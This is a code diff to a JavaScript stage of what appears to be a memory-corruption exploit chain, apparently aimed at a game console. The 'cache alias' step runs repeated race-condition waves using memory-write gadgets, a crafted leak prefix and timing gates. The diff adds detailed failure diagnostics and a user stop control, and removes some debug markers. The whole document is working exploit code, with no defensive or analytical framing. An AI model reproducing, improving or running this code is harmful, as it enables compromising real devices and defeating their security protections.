@@ -1,5 +1,5 @@
-import coreRuntime from "../runtime.mjs";
-import {emitFastStage} from "../log-stage.mjs";
+import coreRuntime, {waitMs} from "../runtime.mjs";
+import {emitVerboseStage, isVerboseLogging} from "../log-stage.mjs";
 
 const {
   GADGET_MEMSET,
@@ -21,6 +21,107 @@ const {
   write8,
   writeDirtyData
 } = coreRuntime;
+
+function formatHexValue(value) {
+    return value == null || !Number.isFinite(Number(value))
+        ? "na" : "0x" + Number(value).toString(16);
+}
+
+function formatResultCode(value) {
+    if (value == null) return "na";
+    var raw = Number(value) >>> 0;
+    var canonical = raw === 0xFFFFFFFF ? raw : raw & 0x3FFFFF;
+    return raw === canonical
+        ? "0x" + raw.toString(16)
+        : "0x" + raw.toString(16) + "/0x" + canonical.toString(16);
+}
+
+function formatRenameInputDiagnostics(diagnostics) {
+    if (!diagnostics) return "unavailable";
+    var labels = [
+        ["src", "fillerSource"], ["dst", "fillerDestination"],
+        ["guard0", "guardSource"], ["guard1", "guardDestination"]
+    ];
+    var summaries = [];
+    for (var i = 0; i < labels.length; i++) {
+        var label = labels[i][0];
+        var name = labels[i][1];
+        var before = diagnostics.before?.[name];
+        var after = diagnostics.after?.[name];
+        if (!before?.available || !after?.available) {
+            summaries.push(label + "=unavailable");
+            continue;
+        }
+        var beforeStatus = before.matchesExpected ? "ok" : "diff@" +
+            (before.firstDiff ? before.firstDiff.offset : "?");
+        var afterStatus = after.matchesExpected ? "ok" : "diff@" +
+            (after.firstDiff ? after.firstDiff.offset : "?");
+        var status = beforeStatus + ">" + afterStatus +
+            (before.hash !== after.hash ? "/mutated" : "");
+        summaries.push(label + "/" + before.size + "=0x" +
+            before.hash.toString(16) + ">0x" + after.hash.toString(16) +
+            "/" + status);
+    }
+    var descriptorStatus = diagnostics.descriptorsOk ? "ok" : "bad";
+    if (!diagnostics.descriptorsOk && diagnostics.descriptors?.roles) {
+        var badRoles = diagnostics.descriptors.roles.filter(role =>
+            role.descriptors.some(desc => !desc.matchesExpected));
+        descriptorStatus += ":" + badRoles.map(role => "W" + role.role + "[" +
+            role.descriptors.map((desc, index) => index + ":" +
+                desc.index + "/" + desc.size + "@0x" +
+                desc.address.toString(16) + "/0x" +
+                desc.word0.toString(16) + "/0x" +
+                desc.word1.toString(16)).join(",") + "]").join(";");
+    }
+    return summaries.join(",") + ";xdesc=" + descriptorStatus;
+}
+
+function formatCopyWaveDiagnostics(gateFailures, shapeMissing, minMarginUs,
+    maxMarginUs, minLowCacheUsed, maxLowCacheUsed, pathReplyFailures) {
+    const parts = [];
+    const gates = Object.keys(gateFailures || {}).sort((a, b) =>
+        gateFailures[b] - gateFailures[a]);
+    if (gates.length) {
+        const shown = gates.slice(0, 5).map(key =>
+            key + "=" + gateFailures[key]);
+        if (gates.length > shown.length)
+            shown.push("+" + (gates.length - shown.length) + " other gates");
+        parts.push("gate rejects: " + shown.join(", "));
+    }
+
+    const missing = Object.keys(shapeMissing || {}).sort((a, b) =>
+        shapeMissing[b] - shapeMissing[a]);
+    if (missing.length) {
+        const shown = missing.slice(0, 4).map(role =>
+            role + "=" + shapeMissing[role]);
+        if (missing.length > shown.length)
+            shown.push("+" + (missing.length - shown.length) + " roles");
+        parts.push("overlap missing: " + shown.join(", "));
+    }
+
+    if (Number.isFinite(minMarginUs) && Number.isFinite(maxMarginUs))
+        parts.push("margin=" + minMarginUs.toFixed(0) + ".." +
+            maxMarginUs.toFixed(0) + "µs");
+    if (Number.isFinite(minLowCacheUsed) && Number.isFinite(maxLowCacheUsed))
+        parts.push("low cache hold=0x" + minLowCacheUsed.toString(16) +
+            "..0x" + maxLowCacheUsed.toString(16));
+
+    const pathReplies = Object.keys(pathReplyFailures || {}).sort((a, b) =>
+        pathReplyFailures[b].count - pathReplyFailures[a].count);
+    if (pathReplies.length) {
+        const shown = pathReplies.slice(0, 5).map(key => {
+            const stats = pathReplyFailures[key];
+            const rawExample = stats.rawExample == null
+                ? "unknown" : "0x" + stats.rawExample.toString(16);
+            return key + "=" + stats.count + " (raw " + rawExample + ")";
+        });
+        if (pathReplies.length > shown.length)
+            shown.push("+" + (pathReplies.length - shown.length) + " other replies");
+        parts.push("non-202 path replies: " + shown.join(", "));
+    }
+
+    return parts.length ? " · " + parts.join(" · ") : "";
+}
 
 // ── Post-canary candidate and cache alias (S13–S14) ─────────────────────────
 
@@ -132,6 +233,7 @@ export async function installCacheAlias({
   workerStateSafe,
   fragmentBufs,
   triggerBuf,
+  renamePathBuffers = null,
   clearPkt,
   clearSendIndex,
   pinFirstWaveQualified,
@@ -143,7 +245,8 @@ export async function installCacheAlias({
   canaryPath,
   setupPath,
   setupPkt,
-  reportProgress = null
+  reportProgress = null,
+  shouldStop = null
 }) {
   let aliasInstalled;
   let candidateCacheNeedsRetirement = false;
@@ -152,6 +255,7 @@ export async function installCacheAlias({
   let copyFailureReason;
   let copyStepFailures;
   let copyFailureCounts;
+  let stoppedByUser = Boolean(shouldStop?.());
     // S14: Cache alias installation.
     aliasInstalled = false;
     copyWavesTotal = 0;
@@ -163,12 +267,14 @@ export async function installCacheAlias({
         copyFailureCounts[reason] = (copyFailureCounts[reason] || 0) + 1;
     };
 
-    if (!canaryQualified) copyFailureReason = "canary-not-qualified";
+    if (stoppedByUser) copyFailureReason = "stopped-by-user";
+    else if (!canaryQualified) copyFailureReason = "canary-not-qualified";
     else if (!workerStateSafe) copyFailureReason = "worker-state-unsafe";
     else if (!candidateHandle) copyFailureReason = "candidate-storage-unavailable";
     else if (!primeHex) copyFailureReason = "candidate-prime-read-unavailable";
 
-    if (canaryQualified && workerStateSafe && candidateHandle && primeHex) {
+    if (canaryQualified && workerStateSafe && candidateHandle && primeHex &&
+        !stoppedByUser) {
         // Combined leak prefix (0x12 = 18 bytes):
         //   aliasOffset LE (8) + 0x4141414141414141 (8) + dirty=1 (1) + NUL (1)
         var leakPrefix = config.CACHE_ALIAS_PREFIX.slice();
@@ -183,27 +289,33 @@ export async function installCacheAlias({
             // copy, even if a later timing gate rejects the wave.
             candidateCacheNeedsRetirement = true;
 
-            for (var stepIdx = 0; stepIdx < steps.length; stepIdx++) {
+            for (var stepIdx = 0; stepIdx < steps.length &&
+                !stoppedByUser && !shouldStop?.(); stepIdx++) {
                 var step = steps[stepIdx];
                 var stepConfirmed = false;
                 var stepAttempts = 0;
                 var stepWindowFail = 0;
                 var stepPreLow = 0;
                 var stepPathMiss = 0;
+                var stepGateFailures = Object.create(null);
+                var stepShapeMissing = Object.create(null);
+                var stepPathReplyFailures = Object.create(null);
+                var stepMinMarginUs = null;
+                var stepMaxMarginUs = null;
+                var stepMinLowCacheUsed = null;
+                var stepMaxLowCacheUsed = null;
                 var stepHardFailure = null;
+                var acceptedResult = null;
                 var stepProgressReported = false;
                 var stepProgressThreshold = Math.ceil(
                     config.MAX_COPY_ATTEMPTS * config.COPY_BATCHES / 2);
 
-                for (var batch = 0; batch < config.COPY_BATCHES && !stepConfirmed; batch++) {
-                for (var ca = 0; ca < config.MAX_COPY_ATTEMPTS; ca++) {
+                for (var batch = 0; batch < config.COPY_BATCHES &&
+                    !stepConfirmed && !stoppedByUser && !shouldStop?.(); batch++) {
+                for (var ca = 0; ca < config.MAX_COPY_ATTEMPTS &&
+                    !stoppedByUser && !shouldStop?.(); ca++) {
                     stepAttempts++;
 
-// Diagnostic phase markers (2026-11-14): the last marker on screen identifies
-// which await never returned when a wave wedges the game. Routed through
-// emitFastStage so the stage-only log policy lets them through (raw log()
-// calls are filtered unless verbose). No logic changes.
-                    await emitFastStage("AW1 s" + stepIdx + " b" + batch + " a" + ca);
                     if (!writeDirtyData(savedHandle, dirtyFilePath, config.DIRTY_FILE_SIZE,
                             dirtyWriteBuf, dirtyWritePkt)) {
                         stepHardFailure = "dirty-write-failed";
@@ -211,7 +323,6 @@ export async function installCacheAlias({
                         await log("FAIL: step " + stepIdx + " dirty write");
                         allStepsOk = false; break;
                     }
-                    await emitFastStage("AW2 s" + stepIdx + " b" + batch + " a" + ca);
 
                     resetWaveState(waveData.frames, waveData.backups, REQ,
                         waveData.pktBackups, gates, waveExtra);
@@ -223,6 +334,10 @@ export async function installCacheAlias({
                         allStepsOk = false; break;
                     }
 
+                    var renameInputBefore = renamePathBuffers && isVerboseLogging()
+                        ? helpers.captureRenameInputState(REQ,
+                            renamePathBuffers) : null;
+
                     var group = openReservationGroup(rootSession, pktBuf, 59);
                     if (!group.ok) {
                         stepHardFailure = "reservation-failed";
@@ -230,7 +345,6 @@ export async function installCacheAlias({
                         await log("FAIL: step " + stepIdx + " reservation");
                         allStepsOk = false; break;
                     }
-                    await emitFastStage("AW3 s" + stepIdx + " b" + batch + " a" + ca);
 
                     prepPacket(REQ[9], 4, 8, []);
                     write8(REQ[9] + 0x10n, 2n);
@@ -246,8 +360,6 @@ export async function installCacheAlias({
 
                     var wave = executeWave(waveData.frames, rawScheduling,
                         workerResources, gates, sendIndices);
-                    await emitFastStage("AW4 s" + stepIdx + " b" + batch + " a" + ca +
-                        " started=" + wave.started + " joined=" + wave.joined);
                     wavesStarted += wave.started === 13 ? 1 : 0;
 
                     if (wave.created < 13 || wave.started < 13) {
@@ -279,7 +391,8 @@ export async function installCacheAlias({
                             rootSession, sendIndices,
                             abortControlCanonical: abortControlCanonical,
                             canaryPath: canaryPath, savedHandle,
-                            setupPath: setupPath, setupPkt: setupPkt
+                            setupPath: setupPath, setupPkt: setupPkt,
+                            renamePathBuffers, renameInputBefore
                         });
 
                     var releaseWasSent = roleSendCode(waveData.frames, 9,
@@ -288,26 +401,59 @@ export async function installCacheAlias({
 
                     copyWavesTotal++;
 
+                    if (Number.isFinite(wResult.marginUsRaw)) {
+                        stepMinMarginUs = stepMinMarginUs === null
+                            ? wResult.marginUsRaw
+                            : Math.min(stepMinMarginUs, wResult.marginUsRaw);
+                        stepMaxMarginUs = stepMaxMarginUs === null
+                            ? wResult.marginUsRaw
+                            : Math.max(stepMaxMarginUs, wResult.marginUsRaw);
+                    }
+                    if (!wResult.window) {
+                        var rejectedGates = Array.isArray(wResult.rejections)
+                            ? wResult.rejections : [];
+                        if (!rejectedGates.length)
+                            stepGateFailures["window-unqualified"] =
+                                (stepGateFailures["window-unqualified"] || 0) + 1;
+                        for (var rg = 0; rg < rejectedGates.length; rg++) {
+                            var gateName = rejectedGates[rg];
+                            stepGateFailures[gateName] =
+                                (stepGateFailures[gateName] || 0) + 1;
+                        }
+                        if (rejectedGates.indexOf("shape-10") >= 0) {
+                            for (var sm = 0;
+                                sm < (wResult.shapeMissing || []).length; sm++) {
+                                var missingRole = wResult.shapeMissing[sm];
+                                stepShapeMissing[missingRole] =
+                                    (stepShapeMissing[missingRole] || 0) + 1;
+                            }
+                        }
+                    }
+                    var pathReplies = wResult.pathReplyResults || {};
+                    for (var pr = 0; pr < 4; pr++) {
+                        var pathRole = ["filler0", "filler1", "guard0",
+                            "guard1"][pr];
+                        var pathCode = pathReplies[pathRole];
+                        var pathRaw = pathCode == null
+                            ? null : Number(pathCode) >>> 0;
+                        var pathCanonical = pathRaw == null
+                            ? null : pathRaw === 0xFFFFFFFF
+                                ? pathRaw : pathRaw & 0x3FFFFF;
+                        if (pathCanonical === 0x202) continue;
+                        var pathFailureKey = pathRole + "/0x" +
+                            (pathCanonical == null
+                                ? "unknown" : pathCanonical.toString(16));
+                        if (!stepPathReplyFailures[pathFailureKey])
+                            stepPathReplyFailures[pathFailureKey] = {
+                                count: 0, rawExample: pathRaw
+                            };
+                        stepPathReplyFailures[pathFailureKey].count++;
+                    }
+
                     var accepted = wResult.window &&
                         wResult.preReleaseUsed !== null &&
                         wResult.preReleaseUsed >= config.FIELD_MINIMUM_CACHE_HELD &&
                         wResult.changedPaths.length === 0;
-                    if (reportProgress && accepted) {
-                        await reportProgress("Memory alias progress: copy step " +
-                            (stepIdx + 1) + "/" + steps.length +
-                            " complete after " + copyWavesTotal + " waves.");
-                    } else if (reportProgress && !stepProgressReported &&
-                        stepAttempts >= stepProgressThreshold) {
-                        await reportProgress("Memory alias progress: copy step " +
-                            (stepIdx + 1) + "/" + steps.length +
-                            " is still searching after " + stepAttempts + "/" +
-                            (config.MAX_COPY_ATTEMPTS * config.COPY_BATCHES) +
-                            " waves.");
-                        stepProgressReported = true;
-                    }
-                    await log(helpers.formatWaveSummaryLine(copyWavesTotal,
-                        "cache-" + stepIdx, wResult,
-                        accepted ? "copy-ok" : "copy-rejected", {config}));
                     if (!accepted) {
                         if (!wResult.window) {
                             stepWindowFail++;
@@ -317,17 +463,68 @@ export async function installCacheAlias({
                                  wResult.preReleaseUsed < config.FIELD_MINIMUM_CACHE_HELD) {
                             stepPreLow++;
                             noteCopyFailure("pre-release-below-minimum");
+                            if (Number.isFinite(wResult.preReleaseUsed)) {
+                                stepMinLowCacheUsed = stepMinLowCacheUsed === null
+                                    ? wResult.preReleaseUsed
+                                    : Math.min(stepMinLowCacheUsed,
+                                        wResult.preReleaseUsed);
+                                stepMaxLowCacheUsed = stepMaxLowCacheUsed === null
+                                    ? wResult.preReleaseUsed
+                                    : Math.max(stepMaxLowCacheUsed,
+                                        wResult.preReleaseUsed);
+                            }
                         } else if (wResult.changedPaths.length > 0) {
                             stepPathMiss++;
                             noteCopyFailure("path-mismatch");
                         }
                     }
+                    if (reportProgress && accepted) {
+                        if (!isVerboseLogging())
+                            await reportProgress("Memory alias progress: copy step " +
+                                (stepIdx + 1) + "/" + steps.length +
+                                " complete after " + copyWavesTotal + " waves.");
+                    } else if (reportProgress && !stepProgressReported &&
+                        stepAttempts >= stepProgressThreshold) {
+                        await reportProgress("Memory alias progress: copy step " +
+                            (stepIdx + 1) + "/" + steps.length +
+                            " is still searching after " + stepAttempts + "/" +
+                            (config.MAX_COPY_ATTEMPTS * config.COPY_BATCHES) +
+                            " waves.");
+                        await emitVerboseStage("Memory alias diagnostics: copy step " +
+                            (stepIdx + 1) + "/" + steps.length + " after " +
+                            stepAttempts + " waves" + formatCopyWaveDiagnostics(
+                                stepGateFailures, stepShapeMissing,
+                                stepMinMarginUs, stepMaxMarginUs,
+                                stepMinLowCacheUsed, stepMaxLowCacheUsed,
+                                stepPathReplyFailures) +
+                            " · rejects: window=" + stepWindowFail +
+                            ", cache=" + stepPreLow + ", changed-path=" +
+                            stepPathMiss + ".");
+                        stepProgressReported = true;
+                    }
                     if (accepted) {
+                        acceptedResult = wResult;
                         candidateCacheNeedsRetirement = true;
                         stepConfirmed = true;
-                        break;
                     }
+
+                    // Wave execution is synchronous. Yield once so controller
+                    // actions and the log scroller can run before the next wave.
+                    await waitMs(0);
+                    if (shouldStop?.()) {
+                        stoppedByUser = true;
+                        copyFailureReason = "stopped-by-user";
+                    }
+                    if (stepConfirmed || stoppedByUser) break;
                 }
+                }
+
+                if (stoppedByUser && !stepConfirmed) {
+                    allStepsOk = false;
+                    await emitVerboseStage("Memory alias stopped during step " +
+                        (stepIdx + 1) + "/" + steps.length + " after " +
+                        stepAttempts + " waves.");
+                    break;
                 }
 
                 if (!allStepsOk || !stepConfirmed) {
@@ -348,17 +545,44 @@ export async function installCacheAlias({
                         attempts: stepAttempts, windowRejects: stepWindowFail,
                         preReleaseRejects: stepPreLow, pathMismatches: stepPathMiss,
                         reason: stepFailureReason});
+                    await emitVerboseStage("Memory alias step " +
+                        (stepIdx + 1) + "/" + steps.length +
+                        " rejected after " + stepAttempts + " waves: window=" +
+                        stepWindowFail + ", cache=" + stepPreLow +
+                        ", changed-path=" + stepPathMiss +
+                        formatCopyWaveDiagnostics(stepGateFailures,
+                            stepShapeMissing, stepMinMarginUs, stepMaxMarginUs,
+                            stepMinLowCacheUsed, stepMaxLowCacheUsed,
+                            stepPathReplyFailures) +
+                        ".");
                     await log("  step " + stepIdx + " FAIL att=" + stepAttempts +
                         " winFail=" + stepWindowFail + " preLow=" + stepPreLow +
-                        " pathMiss=" + stepPathMiss);
+                        " changedPathMiss=" + stepPathMiss);
                     allStepsOk = false; break;
                 }
 
                 copyStepsCompleted++;
+                await emitVerboseStage("Memory alias step " +
+                    (stepIdx + 1) + "/" + steps.length + " accepted after " +
+                    stepAttempts + " waves" +
+                    (acceptedResult?.margin != null
+                        ? " · margin=" + acceptedResult.margin + "/300µs" : "") +
+                    (acceptedResult?.preReleaseUsed != null
+                        ? " · cache=0x" +
+                          Number(acceptedResult.preReleaseUsed).toString(16) : "") +
+                    ".");
                 await log("  step " + stepIdx + " OK (att=" + stepAttempts + ")");
+                if (stoppedByUser) {
+                    allStepsOk = false;
+                    break;
+                }
             }
 
-            aliasInstalled = allStepsOk;
+            if (shouldStop?.()) {
+                stoppedByUser = true;
+                copyFailureReason = "stopped-by-user";
+            }
+            aliasInstalled = allStepsOk && !stoppedByUser;
         }
 
         await log("ALIAS: " + (aliasInstalled ? "OK" : "FAIL") +
@@ -369,5 +593,5 @@ export async function installCacheAlias({
   return {ok: true, aliasInstalled, candidateCacheNeedsRetirement,
       copyStepsCompleted, copyWavesTotal, copyFailureReason,
       copyFailureCounts, copyStepFailures, wavesJoined, wavesStarted,
-      workerStateSafe};
+      workerStateSafe, stoppedByUser};
 }
